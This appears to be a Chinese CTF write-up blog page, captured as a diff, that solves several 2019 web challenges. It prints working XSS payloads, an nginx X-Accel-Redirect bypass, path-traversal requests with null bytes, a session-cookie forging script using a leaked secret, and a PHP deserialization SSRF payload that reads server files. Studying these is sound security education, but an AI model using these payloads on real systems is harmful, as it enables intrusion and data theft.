+<p>可能大家都会对$1这个特殊字符表示什么意思不是很理解，其实$1表示的就是左边表达式中括号内的字符，即第一个子匹配，同理可得$2表示第二个子匹配。。什么是子匹配呢？？通俗点讲，就是左边每一个括号是第一个字匹配，第二个括号是第二个子匹配。</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/mmzuo-798/p/7264093.html" target="_blank" rel="noopener">js正则表达式详解</a></p>
+<p>题目要求触发xss弹出1，我们可以看到<code>&lt;img&gt;</code>标签,于是以<code>&lt;img src=&quot;(url)&quot; onload=&quot;alert(1)&quot;&gt;</code><br>payload:<code>![hello%22onload=%22alert(%271%27);](https://cristianrichie.github.io/assets/images/me.jpg)</code></p>
+<p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">xss cheatsheet</a></p>
+<h2 id="Cloudb"><a href="#Cloudb" class="headerlink" title="Cloudb"></a>Cloudb</h2><p>//这题复现时有点问题，没有云端验证的post请求</p>
+<h2 id="Bigspin"><a href="#Bigspin" class="headerlink" title="Bigspin"></a>Bigspin</h2><p>查看源码：</p>
+<pre><code>&lt;html&gt;
+What&apos;s it gonna be? Are you an &lt;a href=&quot;/uberadmin/&quot;&gt;uberadmin&lt;/a&gt;, an &lt;a href=&quot;/admin/&quot;&gt;admin&lt;/a&gt;, a &lt;a href=&quot;/user/&quot;&gt;user&lt;/a&gt;, or (most likely) just a &lt;a href=&quot;/pleb/&quot;&gt;pleb&lt;/a&gt;?
+&lt;/html&gt;
+</code></pre><p><strong>uberadmin：403<br>admin：404<br>user：403<br>pleb：出现了一个example网页</strong><br><img src="https://i.imgur.com/JbojjFN.png" alt=""></p>
+<p>进一步尝试<code>/pleb./</code>,显示<strong>502 bad getaway</strong>，搜索nginx出现502的<a href="https://www.keycdn.com/support/502-bad-gateway" target="_blank" rel="noopener">原因</a>，得到如下：</p>
+<blockquote>
+<p>What Are the Reasons for 502 Bad Gateway Responses?<br>There are 3 main culprits that cause 502 Bad Gateway responses. These include:</p>
+<p><strong>Domain name not resolvable</strong>: The domain name is not resolving to the correct IP or it does not resolve to any IP. It is important to note that DNS changes could take same time until they are global fully propagated and active. This is dependant on the TTL, or time to live, defined per record.<br><strong>Origin server down</strong>: The server is not reachable, either because it is down or there is no connectivity to the server given.<br><strong>Firewall blocks request</strong>: A firewall blocks the communication between the edge servers and the origin server. This can also be caused by security plugins of your CMS. Some DDOS protection and mitigation systems might are too overreactive and start blocking requests from our content delivery servers.</p>
+</blockquote>
+<p>最有可能的原因就是”domain name not resolvable”，<code>/pleb</code>指向了一个<strong>www.example.com</strong>域名，他是可解析的，但当我们添加了“dd”之后，域名就变为了<strong>www.example.comdd</strong>,因此无法处理</p>
+<p>这里有个点，利用<a href="http://nip.io" target="_blank" rel="noopener">nip.io</a><br>于是有payload：<code>/pleb.127.0.0.1.nip.io/user/</code>,得到回显</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Index of /user/&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor=&quot;white&quot;&gt;
+&lt;h1&gt;Index of /user/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;
+&lt;a href=&quot;nginx.c%C3%B6nf%20&quot;&gt;nginx.c枚nf &lt;/a  05-Apr-2019 11:511253
+&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>因为nginx对特殊字符的处理不太友好，因此将<code>nginx.c枚nf</code>进行两次urlencode，得到<code>nginx.c%25C3%25B6nf%2520</code>，于是访问</p>
+<pre><code>worker_processes 1;
+user nobody nobody;
+error_log /dev/stdout;
+pid /tmp/nginx.pid;
+events {
+  worker_connections 1024;
+}
+
+http {
+
+# Set an array of temp and cache files options that otherwise defaults to
+# restricted locations accessible only to root.
+
+client_body_temp_path /tmp/client_body;
+fastcgi_temp_path /tmp/fastcgi_temp;
+proxy_temp_path /tmp/proxy_temp;
+scgi_temp_path /tmp/scgi_temp;
+uwsgi_temp_path /tmp/uwsgi_temp;
+resolver 8.8.8.8 ipv6=off;
+
+server {
+listen 80;
+
+location / {
+root /var/www/html/public;
+try_files $uri $uri/index.html $uri/ =404;
+}
+
+location /user {
+allow 127.0.0.1;
+deny all;
+autoindex on;
+root /var/www/html/;
+}
+
+location /admin {
+internal;
+autoindex on;
+alias /var/www/html/admin/;
+}
+
+location /uberadmin {
+allow 0.13.3.7;
+deny all;
+autoindex on;
+alias /var/www/html/uberadmin/;
+}
+
+location ~ /pleb([/a-zA-Z0-9.:%]+) {
+proxy_pass   http://example.com$1;
+}
+
+access_log /dev/stdout;
+error_log /dev/stdout;
+}
+
+}
+</code></pre><p>尝试访问<strong>uberadmin</strong>，又出现了502，这时转而查看<strong>/admin</strong>,允许的地址范围是<strong>internal</strong>,google一番，在官方文档中找到<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#internal" target="_blank" rel="noopener">解释</a>：</p>
+<blockquote>
+<p>Specifies that a given location can only be used for internal requests. For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:</p>
+<p>requests redirected by the error_page, index, random_index, and try_files directives;<br>requests redirected by the “X-Accel-Redirect” response header field from an upstream server;<br>subrequests formed</p>
+</blockquote>
+<p>注意到第二条，于是可以利用“X-Accel-Redirect”<br>思路是在自己服务器上，写上如下代码：</p>
+<pre><code>&lt;?php
+header(&quot;X-Accel-Redirect:/admin/&quot;)
+?&gt;
+</code></pre><p>然后访问自己的服务器，得到一个flag.txt,但直接更改为“/admin/flag.txt”会访问失败，要求uberadmin才能访问，于是再次更改为“/admin../uberadmin/flag.txt”即可</p>
+<p>很鬼，我访问失败了，放个writeup链接：<br><a href="https://medium.com/@defmax/midnight-sun-ctf-2019-quals-writeup-437ea139d90c" target="_blank" rel="noopener">https://medium.com/@defmax/midnight-sun-ctf-2019-quals-writeup-437ea139d90c</a></p>
+<ul>
+<li>另一种方法（成功）</li>
+</ul>
+<p>在自己vps上的nginx.conf中添加如下配置：</p>
+<pre name="code">
+location = /x.html {
+        add_header X-Accel-Redirect "/admin/";
+        return 200 hm;
+}
+</pre>
+
+<p>访问/pleb.ip.nip.io/x.html,成功跳转</p>
+<p>尝试改为<code>/admin/flag.txt</code>,提示</p>
+<blockquote>
+<p>hmmm, should admins really get flags? seems like an uberadmin thing to me</p>
+</blockquote>
+<p>于是再次添加如下配置：</p>
+<pre>
+location = /y.html {
+        add_header X-Accel-Redirect "/admin../uberadmin/flag.txt";
+        return 200 hm;
+}
+</pre>
+
+
+<p>成功得到flag</p>
+<h2 id="marcoolio"><a href="#marcoolio" class="headerlink" title="marcoolio"></a>marcoolio</h2><p>关键代码如下：</p>
+<pre><code>&lt;script&gt;
+input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);
+var converter = new showdown.Converter({tables: true});
+
+window.onload=function(){
+  $(&quot;#markdown&quot;).val(input);
+  html = converter.makeHtml(input);
+  clean = DOMPurify.sanitize(html);
+  md = converter.makeMarkdown(clean);
+  if(md.replace(/[\s\\]/g,&quot;&quot;) === input.replace(/[\s\\]/g,&quot;&quot;)){
+$(&quot;#render&quot;).html(html);
+  }else{
+  $(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
+  $(&quot;#error&quot;).text(&quot;hacking attempt!!!&quot;);
+  }
+}
+
+function rerender(){
+  try{
+input = $(&quot;#markdown&quot;).val();
+html = converter.makeHtml(input);
+clean = DOMPurify.sanitize(html);
+md = converter.makeMarkdown(clean);
+if(md.replace(/[\s\\]/g,&quot;&quot;) === input.replace(/[\s\\]/g,&quot;&quot;)){
+  $(&quot;#render&quot;).html(html);
+}else{
+  $(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
+  $(&quot;#error&quot;).text(&quot;hacking attempt!!!&quot;);
+}
+  }catch(x){
+$(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
+$(&quot;#error&quot;).text(x);
+  }
+}
+
+&lt;/script&gt;
+</code></pre><p>注意到使用了<strong>DOMPurify.sanitize</strong>，它可以用来进行xss过滤，查看DOMPurify的<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">文档</a>，注意到一段文字：</p>
+<blockquote>
+<p>The resulting HTML can be written into a DOM element using innerHTML or the DOM using document.write(). That is fully up to you. But keep in mind, if you use the sanitized HTML with jQuery’s very insecure elm.html() method, then the SAFE_FOR_JQUERY flag has to be set to make sure it’s safe! Other than that, all is fine.</p>
+</blockquote>
+<p>使用了jQuery且没有<strong>SAFE_FOR_JQUERY</strong>,下一步就是找payload，然后在<a href="https://github.com/cure53/DOMPurify/blob/2724763e41313b1a54724dfda5573e8b63116962/test/test-suite.js#L53" target="_blank" rel="noopener">测试用例</a>中找到关于<strong>SAFE_FOR_JQUERY</strong>的payload，第三个：<code>&lt;option&gt;&lt;style&gt;&lt;/option&gt;&lt;/select&gt;&lt;b&gt;&lt;img src=xx: onerror=alert(1)&gt;&lt;/style&gt;&lt;/option&gt;</code>可用</p>
+<h2 id="Marcozuckerbergo"><a href="#Marcozuckerbergo" class="headerlink" title="Marcozuckerbergo"></a>Marcozuckerbergo</h2><p>关键代码：</p>
+<pre><code>&lt;script&gt;
 input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);
 
-function markdown(text)...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-04-08</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/04/03/CTF/VolgaCTF 2019(web)/">VolgaCTF 2019 Quals</a></h3></div><div class="post-content"><p>VolgaCTF 2019 Qualsshoppayload:&amp;balance=2000
-shop2payload:name=ausername&amp;CartItems[0].id=4
-gallery先使用SourceLeakHacker这个脚本爆目录，发现无法得到正常返回结果，看了writeup，发...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-04-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/04/01/CTF/fireshell ctf(vice)/">fireshell ctf2019 vice</a></h3></div><div class="post-content"><p>fireshell ctf2019 vice题目给出源码
-&lt;?php
+window.onload=function(){
+  $(&quot;#markdown&quot;).text(input);
+  $(&quot;#render&quot;).text($(&quot;#markdown&quot;).text());
+  mermaid.init(undefined, $(&quot;#render&quot;));
+}
+
+function rerender(){
+  try{
+$(&quot;#render&quot;).html();$(&quot;#render&quot;).removeAttr(&quot;data-processed&quot;);$(&quot;#render&quot;).text($(&quot;#markdown&quot;).text());mermaid.init(undefined, $(&quot;#render&quot;));
+  }catch(x){
+$(&quot;#render&quot;).html(&quot;&lt;font id=&apos;error&apos; color=red&gt;&lt;/font&gt;&quot;);
+$(&quot;#error&quot;).text(x);
+  }
+}
+
+&lt;/script&gt;
+</code></pre><p>注意到<strong>mermaid.init</strong>这个玩意儿，搜索，可知是一个<a href="https://github.com/knsv/mermaid" target="_blank" rel="noopener">绘图工具</a>，于是寻求找到问题，查询issue，看到<a href="https://github.com/knsv/mermaid/issues/548" target="_blank" rel="noopener">一个</a>，提问者想要插入图片，下面给出了一个payload：<code>graph TD; Dir((&lt;img src=&#39;https://iconscout.com/ms-icon-310x310.png&#39; width=&#39;40&#39; /&gt;))</code>，尝试<code>graph TD; Dir((&lt;img src=&#39;address.png&#39; width=&#39;40&#39; onerror=&#39;javascript:alert</code>1<code>&#39;&gt;))</code>，成功！</p>
+<ul>
+<li>另一种方法<br><a href="https://github.com/knsv/mermaid/issues/213" target="_blank" rel="noopener">issue 213</a>，如果使用如下格式：</li>
+</ul>
+<pre><code>graph LR
+id1[&quot;This is the (text) in the box&quot;]
+</code></pre><p>可以插入标签，于是：</p>
+<pre><code>graph LR
+id1(&quot;&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt;&lt;/img&gt;&quot;)
+</code></pre><h2 id="Rubenscube"><a href="#Rubenscube" class="headerlink" title="Rubenscube"></a>Rubenscube</h2>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/04/03/CTF/VolgaCTF 2019(web)/"><span>VolgaCTF 2019 Quals</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/03/CTF/VolgaCTF 2019(web)/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-03T14:48:07.775Z">
+          2019-04-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="VolgaCTF-2019-Quals"><a href="#VolgaCTF-2019-Quals" class="headerlink" title="VolgaCTF 2019 Quals"></a>VolgaCTF 2019 Quals</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>payload:<code>&amp;balance=2000</code></p>
+<h2 id="shop2"><a href="#shop2" class="headerlink" title="shop2"></a>shop2</h2><p>payload:<code>name=ausername&amp;CartItems[0].id=4</code></p>
+<h2 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h2><p>先使用<strong>SourceLeakHacker</strong>这个脚本爆目录，发现无法得到正常返回结果，看了writeup，发现了<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>这个东西</p>
+<blockquote>
+<p>用法：./dirsearch.py -u url</p>
+</blockquote>
+<p>发现了一些js文件<br><strong>main.js</strong></p>
+<pre><code>  $(document).ready(function() {
+year = parseInt(location.pathname.slice(1)) || 2018;
+$.getJSON(`/api/images?year=${year}`, function(data) {
+  $.each(data, function(key, img) {
+
+$(&apos;&lt;div&gt;&apos;, {
+class: &apos;col-lg-3 col-md-4 col-xs-6&apos;,
+html: $(&apos;&lt;a&gt;&apos;, {
+  href: `/api/image?year=${year}&amp;img=${img}`,
+  class: &apos;d-block mb-4 h-100&apos;,
+  html: $(&apos;&lt;img&gt;&apos;, {
+class: &apos;img-fluid img-thumbnail&apos;,
+src: `/api/image?year=${year}&amp;img=${img}`,
+alt: &apos;&apos;
+  })
+})
+ }).appendTo($(&apos;#gallery&apos;));;
+  });
+}).fail(function() { location = &apos;/login&apos;;});
+  });
+</code></pre><p><strong>index.js</strong></p>
+<pre><code>const express= require(&apos;express&apos;);
+const session = require(&apos;express-session&apos;);
+const store = require(&apos;session-file-store&apos;)(session);
+const proxy = require(&apos;http-proxy-middleware&apos;);
+const parser = require(&apos;body-parser&apos;);
+const fs = require(&apos;fs&apos;);
+const app = express();
+
+config = require(&apos;./config&apos;);
+auth = require(&apos;./auth&apos;)();
+config.session.store = new store();
+
+app.use(parser.urlencoded({ extended: false }));
+app.use(`${config.apiPrefix}/*`, session(config.session));
+app.use(`${config.apiPrefix}/*`, auth.unless({path: config.whitelistPaths}));
+
+app.post(`${config.apiPrefix}/login`, function (req, res) {
+    /* TODO: Implement login*/
+    res.redirect(&apos;/login&apos;);
+});
+
+app.get(`${config.apiPrefix}/logout`, function (req, res) {
+    /* TODO: Implement logout */
+    res.redirect(&apos;/login&apos;);
+});
+
+app.get(`${config.apiPrefix}/flag`, function (req, res) {
+    console.log(req.session);
+    if(req.session.name === &apos;admin&apos;)
+        res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
+    else
+        res.status(403).send();
+});
+
+app.use(proxy(config.proxy));
+app.listen(config.server.port);
+</code></pre><p><strong>config.js</strong></p>
+<pre><code>const config = {
+  apiPrefix: &apos;/api&apos;,
+  server: {
+port: 4000
+  },
+  proxy: {
+target: &apos;http://localhost:5000&apos;,
+autoRewrite: true
+  },
+  session: {
+name: &apos;SESSION&apos;,
+saveUninitialized: false,
+secret: &apos;;GmU1FSlVETF/vzEaBHP&apos;,
+rolling: true,
+resave: false
+  },
+  whitelistPaths: [
+&apos;/api/login&apos;, &apos;/api/logout&apos;
+  ]
+}
+
+module.exports = config;
+</code></pre><p><strong>auth.js</strong></p>
+<pre><code>const unless = require(&apos;express-unless&apos;);
+
+const auth = function () {
+  var authm = function (req, res, next) {
+    console.log(req.session);
+if (!req.session.name) {
+    res.status(403).send();
+} else {
+        next();
+}
+  }
+  authm.unless = unless;
+  return authm;
+};
+
+module.exports = auth;
+</code></pre><p>基于node.js的服务端<br>这里要涉及到<strong>wget</strong>相关命令，它可以下载网站目录的文件，几个常用指令</p>
+<blockquote>
+<p>-c 断点续传</p>
+<p>-r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件</p>
+<p>-nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录</p>
+<p>-np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/ 没有加参数-np，就会同时下载path的上一级目录pub下的其它文件</p>
+<p>-k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数</p>
+<p>-L 递归时不进入其它主机，如wget -c -r www.xxx.org/ 如果网站内有一个这样的链接： www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</p>
+<p>-p 下载网页所需的所有文件，如图片等 -A 指定要下载的文件样式列表，多个样式用逗号分隔 -i 后面跟一个文件，文件内指明要下载的URL</p>
+<p>-P 保存到指定目录</p>
+</blockquote>
+<p>config.js将session存储到本地服务器，似乎无法拿到，从index.js来看：</p>
+<pre><code>app.get(`${config.apiPrefix}/flag`, function (req, res) {
+console.log(req.session);
+if(req.session.name === &apos;admin&apos;)
+res.end(fs.readFileSync(&apos;../../flag&apos;, &apos;utf8&apos;));
+else
+res.status(403).send();
+});
+</code></pre><p>session要认证为admin，但似乎无法伪造，于是将目标转到接口，但<code>api/login</code>和<code>api/logout</code>都没什么可利用的，参考了writeup，提到了一种请求方式：<strong>options request</strong>，有如下解释：</p>
+<blockquote>
+<p>HTTP 的 OPTIONS 方法 用于获取目的资源所支持的通信选项。客户端可以对特定的 URL 使用 OPTIONS 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。</p>
+<p>语法：<br>OPTIONS /index.html HTTP/1.1<br>OPTIONS * HTTP/1.1</p>
+<p>在 CORS 中，可以使用 OPTIONS 方法发起一个预检请求，以检测实际请求是否可以被服务器所接受。预检请求报文中的 Access-Control-Request-Method 首部字段告知服务器实际请求所使用的 HTTP 方法；Access-Control-Request-Headers 首部字段告知服务器实际请求所携带的自定义首部字段。服务器基于从预检请求获得的信息来判断，是否接受接下来的实际请求。</p>
+</blockquote>
+<p>发送如下请求：</p>
+<pre><code>OPTIONS /api/logout HTTP/1.1
+Host: gallery.q.2019.volgactf.ru
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><p>回显了报错信息：<br><img src="https://i.imgur.com/oSv3xxo.png" alt=""></p>
+<p>laravel框架，访问<code>/api/image</code>出现403，考虑<a href="https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001" target="_blank" rel="noopener">bypass</a>)，这里因为没有对路径访问做过滤，所以可以直接<code>//</code>或者多个<code>/</code>的方式进行绕过，于是<code>GET //api/images HTTP/1.1</code>，成功回显了一个空数组，因为没有传参</p>
+<p>当<code>GET //api/images/?year=2019 HTTP/1.1</code>，再次报错<br><img src="https://i.imgur.com/4Dy031e.png" alt=""></p>
+<ul>
+<li>既然<strong>/2019/img</strong>，也就是说可以控制路径访问任意，验证猜想：<code>GET //api/images?year=2018%00 HTTP/1.1</code>，response返回<code>[&quot;img&quot;]</code></li>
+</ul>
+<ul>
+<li>继续<code>GET //api/images?year=2018/../../../../../../../var/www%00</code>，response返回<code>[&quot;html&quot;,&quot;flag&quot;,&quot;apps&quot;]</code></li>
+</ul>
+<ul>
+<li><p>尝试直接读取<code>GET //api/image?year=2018/../../../../../../../var/www/%00&amp;img=../flag HTTP/1.1</code>，然而报错：<br><img src="https://i.imgur.com/yo4cAtq.png" alt=""></p>
+</li>
+<li><p>所以转而尝试读取<code>GET //api/images?year=2018/../../../../../../../var/www/html%00 HTTP/1.1</code>，response为<code>[&quot;index.html&quot;]</code>，无用</p>
+</li>
+</ul>
+<ul>
+<li>访问<code>GET //api/images?year=2018/../../../../../../../var/www/apps%00 HTTP/1.1</code>，response为<code>[&quot;volga_gallery&quot;,&quot;volga_adminpanel&quot;,&quot;volga_auth&quot;]</code></li>
+</ul>
+<ul>
+<li>继续<code>GET //api/images?year=2018/../../../../../../../var/www/apps/volga_adminpanel%00 HTTP/1.1</code>，response为<code>[&quot;sessions&quot;,&quot;app.js&quot;]</code>，这里可以猜想，获取到sessions中的值就可以伪造为admin</li>
+</ul>
+<ul>
+<li>于是继续访问<code>GET //api/images?year=2018/../../../../../../../var/www/apps/volga_adminpanel/sessions%00 HTTP/1.1</code>，response为<code>[&quot;euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json&quot;]</code><br>关键的一点，如何构造session，我们有了secret，那么可以尝试自己在本地构造<br>先安装<code>npm install express-session</code></li>
+</ul>
+<p>poc：</p>
+<pre><code>var cookie = require(&apos;cookie-signature&apos;);
+var val = cookie.sign(unescape(&apos;../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM&apos;), &apos;;GmU1FSlVETF/vzEaBHP&apos;);
+console.log(&apos;Cookie: SESSION=s:&apos;+val);
+</code></pre><p>得到session：<code>Cookie: SESSION=s:../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB/J4sPnVj5QkDEuBu/0QelFQQqAV6yh4</code></p>
+<p><strong>reference:</strong><br><a href="https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals" target="_blank" rel="noopener">https://github.com/BlackFan/ctfs/tree/master/volgactf_2019_quals</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/04/01/CTF/fireshell ctf(vice)/"><span>fireshell ctf2019 vice</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/01/CTF/fireshell ctf(vice)/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-01T09:02:24.410Z">
+          2019-04-01
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="fireshell-ctf2019-vice"><a href="#fireshell-ctf2019-vice" class="headerlink" title="fireshell ctf2019 vice"></a>fireshell ctf2019 vice</h1><p>题目给出源码</p>
+<pre><code>&lt;?php
 //require_once &apos;config.php&apos;;
 
 class SHITS{
   private $url;
   private $method;
   private $addr;
-  private $hos...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-04-01</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/30/CTF/Securinets Prequals CTF 2019/">Securinets Prequals CTF 2019</a></h3></div><div class="post-content"><p>Securinets Prequals CTF 2019custom location在url后追加/robots.txt，报错，出现调试页面，仔细观察url，尝试读取文件
-https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php
-跟入...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/29/OS/command/">常用指令及其含义(linux 和 windows)</a></h3></div><div class="post-content"><p>常用指令及其含义linuxcwd意义：get pathname of current working directory
-DescriptionThis module provides functions for determining the pathname of the current working di...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/command/" title="command">command </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/29/OS/proc/">linux /proc目录</a></h3></div><div class="post-content"><p>linux /proc目录Linux Filesystem Hierarchy:Prev    Chapter 1. Linux Filesystem Hierarchy    Next1.14. /proc/proc is very special in that it is also a virtual fi...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/proc/" title="/proc">/proc </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/26/CTF/hackim ctf/">hackim web</a></h3></div><div class="post-content"><p>hackim webescaperfv查看响应信息发现字段X-Powered-By，其对应的为express可知为后端为nodejs
-mime checkr只能上传.jpeg格式图片，有一个类型检查的功能这里有很重要的一点，一个getmime.bak的备份源码文件（不看writeup我是肯定不知道的，orz）
-&...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-26</span><i class="fa fa-tag"></i><a class="tag" href="/tags/CTF/" title="CTF">CTF </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/25/vulnerable/xxe/">xxe</a></h3></div><div class="post-content"><p>xxexml基础什么是 XML?
+  private $host;
+  private $name;
 
-XML 指可扩展标记语言（EXtensible Markup Language）XML 是一种标记语言，很类似 HTMLXML 的设计宗旨是传输数据，而非显示数据XML 标签没有被预定义。您需要自行定义标签。XML 被设计为具有自我描述性。XML 是 W3C 的推荐标准
+  function __construct($method,$url){
+$this-&gt;method = $method;
+$this-&gt;url = $url;
+  }
 
-结构...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-03-25</span><i class="fa fa-tag"></i><a class="tag" href="/tags/xxe/" title="xxe">xxe </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/03/18/OS/linux常见问题/">Linux常见错误</a></h3></div><div class="post-content"><p>ubuntu常见错误Package has no installation candidate解决：
-# apt-get update
+  function doit(){
+
+$this-&gt;host = @parse_url($this-&gt;url)[&apos;host&apos;];
+$this-&gt;addr = @gethostbyname($this-&gt;host);
+$this-&gt;name = @gethostbyaddr($this-&gt;host);
+if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false){
+  $not = [&apos;.txt&apos;,&apos;.php&apos;,&apos;.xml&apos;,&apos;.html&apos;,&apos;.&apos;,&apos;[&apos;,&apos;]&apos;];
+  foreach($not as $ext){
+$p = strpos($this-&gt;url,$ext);
+if($p){
+  die(&quot;:)&quot;);
+}
+  }
+  $ch = curl_init();
+  curl_setopt($ch,CURLOPT_URL,$this-&gt;url);
+  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+
+  $result = curl_exec($ch);
+  echo $result;
+}else{
+  die(&quot;:)&quot;);
+}
+  }
+  function __destruct(){
+if(in_array($this-&gt;method,array(&quot;doit&quot;))){
+
+  call_user_func_array(array($this,$this-&gt;method),array());
+}else{
+  die(&quot;:)&quot;);
+}
+  }
+}
+if(isset($_GET[&quot;gg&quot;])) {
+@unserialize($_GET[&quot;gg&quot;]);
+} else {
+highlight_file(__FILE__);
+}
+</code></pre><p>传参方式<strong>get</strong>，看到一个很重要的函数，</p>
+<pre><code>  function __destruct(){
+if(in_array($this-&gt;method,array(&quot;doit&quot;))){
+
+  call_user_func_array(array($this,$this-&gt;method),array());
+}else{
+  die(&quot;:)&quot;);
+}
+  }
+</code></pre><p>再看doit()方法，调用了curl建立会话，于是思路：<br><strong>反序列化-&gt;利用file协议读文件（查看config.php）-&gt;绕过限制</strong>，waf在这：</p>
+<pre><code>if($this-&gt;addr !== &quot;127.0.0.1&quot; || $this-&gt;name === false){
+  $not = [&apos;.txt&apos;,&apos;.php&apos;,&apos;.xml&apos;,&apos;.html&apos;,&apos;.&apos;,&apos;[&apos;,&apos;]&apos;];
+  foreach($not as $ext){
+$p = strpos($this-&gt;url,$ext);
+if($p){
+  die(&quot;:)&quot;);
+}
+</code></pre><p>用一个脚本生成序列化：</p>
+<pre><code>&lt;?php
+class SHITS{
+  private $url = &quot;file:///etc/hosts&quot;;
+  private $method = &quot;doit&quot;;
+}
+
+echo urlencode(serialize(new SHITS()));
+
+?&gt;
+</code></pre><p>可以探测到本机内网地址，但是没有回显，于是另一种方式就是猜测地址为：/var/www/html/config.php，但是因为要绕过限制，所以对<strong>.</strong>进行二次url编码%252e，于是生成payload：</p>
+<pre><code>?gg=O:5:%22SHITS%22:2:{s:10:%22%00SHITS%00url%22;s:33:%22file:///var/www/html/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;}
+</code></pre><p>最后curl：</p>
+<blockquote>
